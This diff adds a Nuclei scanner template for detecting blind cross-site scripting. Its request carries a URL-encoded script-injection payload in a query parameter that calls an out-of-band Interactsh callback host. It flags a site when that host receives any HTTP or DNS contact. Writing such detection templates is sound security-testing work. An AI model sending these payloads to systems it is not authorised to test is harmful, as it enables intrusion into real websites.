@@ -1,0 +1,14 @@
+id: K70n0s510-xss-blind
+info:
+  name: Blind XSS via Interactsh
+  author: K70n0s510
+  severity: critical
+  description: Injects a blind XSS payload. If the server renders it, Nuclei detects the callback.
+  tags: xss,blind,oob
+http:
+  - method: GET
+    path: ["{{BaseURL}}/?q=%22%3E%3Cscript%3Esrc=%2F%2F{{interactsh-url}}%3C%2Fscript%3E"]
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words: ["http", "dns"]
